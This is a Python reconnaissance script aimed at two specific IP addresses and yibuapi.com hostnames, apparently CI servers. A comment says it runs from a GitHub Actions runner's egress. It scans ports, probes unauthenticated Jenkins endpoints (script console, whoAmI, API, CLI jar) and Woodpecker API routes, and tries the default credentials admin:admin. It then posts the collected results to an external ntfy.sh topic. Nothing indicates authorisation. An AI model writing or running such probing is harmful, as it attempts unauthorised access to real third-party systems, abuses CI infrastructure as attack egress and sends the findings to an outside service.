#!/usr/bin/env python3
# i45560: probe the two OVH CI hosts from a fresh GHA (Azure) runner egress.
# Targets: 51.222.15.95 (Jenkins :8080, test.yibuapi.com) & 51.210.13.182 (Woodpecker :8000)
# Low-rate: few ports, short timeouts. Reports to ntfy.
import os, sys, socket, ssl, json, re, time, urllib.request

JOB = os.environ.get("JOB", "0")
TOPIC = os.environ.get("TOPIC", "i45560-a7c2")

TARGETS = {
  "51.222.15.95": {"ports":[8080,80,443,3000,3001,22,21], "vhosts":["test.yibuapi.com","jenkins.yibuapi.com","51.222.15.95"]},
  "51.210.13.182": {"ports":[8000,443,80,22], "vhosts":["pre.yibuapi.com","51.210.13.182"]},
}

def log(*a): print(" ".join(str(x) for x in a), flush=True)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3800):
        try:
            req = urllib.request.Request("https://ntfy.sh/"+TOPIC,
                data=((("[j%s %d] " % (JOB, i//3800+1)) + text[i:i+3800]).encode("utf-8","replace")),
                method="POST", headers={"Title": ("i45560-"+tag)[:60]})
            urllib.request.urlopen(req, timeout=12).read()
        except Exception as e:
            log("NTFYERR", str(e)[:80])

def egress():
    for u in ("https://api.ipify.org","https://ifconfig.me/ip","https://icanhazip.com"):
        try: return urllib.request.urlopen(u, timeout=10).read().decode().strip()
        except Exception: pass
    return "ERR"

def tcp_open(ip, port, t=3.0):
    try:
        s = socket.create_connection((ip, port), timeout=t); s.close(); return True
    except Exception as e:
        return False

def http_req(ip, port, host, path="/", tls=False, timeout=8, method="GET", body=None, extra=None):
    s=None
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        if tls:
            ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            s=ctx.wrap_socket(s, server_hostname=host)
        hdr="%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 probe\r\nAccept: */*\r\nConnection: close\r\n"%(method,path,host)
        if extra:
            for k,v in extra.items(): hdr+="%s: %s\r\n"%(k,v)
        if body is not None:
            b=body.encode() if isinstance(body,str) else body
            hdr+="Content-Length: %d\r\n"%len(b); raw=hdr.encode()+b"\r\n"+b
        else:
            raw=hdr.encode()+b"\r\n"
        s.sendall(raw)
        data=b""
        while True:
            ch=s.recv(8192)
            if not ch: break
            data+=ch
            if len(data)>50000: break
        head,_,bd=data.partition(b"\r\n\r\n")
        lines=head.decode("latin-1","replace").split("\r\n")
        status=0
        try: status=int(lines[0].split()[1])
        except Exception: pass
        headers={}
        for ln in lines[1:]:
            if ":" in ln:
                k,v=ln.split(":",1); headers[k.strip().lower()]=v.strip()
        return {"status":status,"headers":headers,"body":bd,"bodylen":len(bd)}
    except Exception as e:
        return {"status":0,"headers":{},"body":b"","bodylen":0,"err":str(e)[:100]}
    finally:
        try:
            if s: s.close()
        except Exception: pass

def title(body):
    try:
        m=re.search(rb"<title[^>]*>(.*?)</title>",body,re.I|re.S)
        if m: return m.group(1).decode("utf-8","replace").strip()[:80]
    except Exception: pass
    return ""

def snip(body,n=140):
    try: return body[:n].decode("utf-8","replace").replace("\n"," ").replace("\r"," ").strip()
    except Exception: return ""

def probe_jenkins(ip,port,host,tls,out):
    log(">> JENKINS %s:%s host=%s tls=%s"%(ip,port,host,tls))
    r=http_req(ip,port,host,"/",tls=tls)
    out.append("JK / %s srv=%s t=%s len=%d loc=%s"%(r["status"],r["headers"].get("server",""),title(r["body"]),r["bodylen"],r["headers"].get("location","")))
    if r["status"]==0: return
    # unauth API + version headers
    r=http_req(ip,port,host,"/api/json",tls=tls)
    out.append("JK /api/json %s len=%d %s"%(r["status"],r["bodylen"],snip(r["body"],120)))
    r=http_req(ip,port,host,"/login",tls=tls)
    out.append("JK /login %s t=%s"%(r["status"],title(r["body"])))
    xj=r["headers"].get("x-jenkins","")
    # whoAmI (unauth read)
    r=http_req(ip,port,host,"/whoAmI/api/json",tls=tls)
    out.append("JK /whoAmI %s %s"%(r["status"],snip(r["body"],160)))
    # script console GET (does it render? unauth should 403/redirect)
    r=http_req(ip,port,host,"/script",tls=tls)
    out.append("JK /script GET %s len=%d t=%s"%(r["status"],r["bodylen"],title(r["body"])))
    # manage
    r=http_req(ip,port,host,"/manage",tls=tls)
    out.append("JK /manage %s loc=%s"%(r["status"],r["headers"].get("location","")))
    # cli jar (needs auth usually) 
    r=http_req(ip,port,host,"/jnlpJars/jenkins-cli.jar",tls=tls)
    out.append("JK cli.jar %s len=%d ct=%s"%(r["status"],r["bodylen"],r["headers"].get("content-type","")))
    # tiny default-cred attempt (admin/admin only, single) via basic auth /api/json
    import base64
    auth="Basic "+base64.b64encode(b"admin:admin").decode()
    r=http_req(ip,port,host,"/api/json",tls=tls,extra={"Authorization":auth})
    out.append("JK basic admin:admin /api/json %s len=%d"%(r["status"],r["bodylen"]))
    if xj: out.append("JK_VERSION "+xj)

def probe_woodpecker(ip,port,host,tls,out):
    log(">> WOODPECKER %s:%s host=%s tls=%s"%(ip,port,host,tls))
    for p in ["/","/api/version","/api/user","/healthz","/version"]:
        r=http_req(ip,port,host,p,tls=tls)
        out.append("WP %s %s srv=%s t=%s len=%d loc=%s %s"%(p,r["status"],r["headers"].get("server",""),title(r["body"]),r["bodylen"],r["headers"].get("location",""),snip(r["body"],100)))
    # unauth API repos/user
    for p in ["/api/user","/api/repos","/api/user/repos","/api/queue"]:
        r=http_req(ip,port,host,p,tls=tls)
        out.append("WPAPI %s %s %s"%(p,r["status"],snip(r["body"],160)))

def classify(ip,port,host,tls,out):
    r=http_req(ip,port,host,"/",tls=tls)
    body=r["body"].lower(); srv=r["headers"].get("server","").lower(); t=title(r["body"]).lower()
    key="%s:%s/%s/%s"%(ip,port,host,"https" if tls else "http")
    log("HTTP %s -> %s srv=%s t=%s len=%d"%(key,r["status"],srv,title(r["body"]),r["bodylen"]))
    out.append("HTTP %s %s srv=%s t=%s len=%d"%(key,r["status"],srv,title(r["body"]),r["bodylen"]))
    if r["status"]==0: return
    if b"jenkins" in body or "jenkins" in srv or "jenkins" in t or r["headers"].get("x-jenkins"):
        probe_jenkins(ip,port,host,tls,out)
    elif b"woodpecker" in body or "woodpecker" in srv or "woodpecker" in t:
        probe_woodpecker(ip,port,host,tls,out)
    else:
        # still try jenkins header and woodpecker probes lightly
        if r["headers"].get("x-jenkins"): probe_jenkins(ip,port,host,tls,out)

def main():
    t0=time.time()
    log("RUN job=%s ts=%s"%(JOB,time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime())))
    eg=egress(); log("EGRESS",eg)
    out=["egress="+eg]
    for ip,cfg in TARGETS.items():
        openp=[p for p in cfg["ports"] if tcp_open(ip,p)]
        log("OPEN",ip,openp); out.append("OPEN %s %s"%(ip,openp))
        if not openp:
            out.append("NO-PORTS %s"%ip); continue
        for p in openp:
            if p in (22,21): continue
            tls_list=[True,False] if p in (443,8443) else [False,True]
            for tls in tls_list:
                for vh in cfg["vhosts"]:
                    classify(ip,p,vh,tls,out)
    log("="*20+" DETAIL "+"="*20)
    for l in out: log("D| "+l)
    send("summary","\n".join(out))

if __name__=="__main__":
    main()
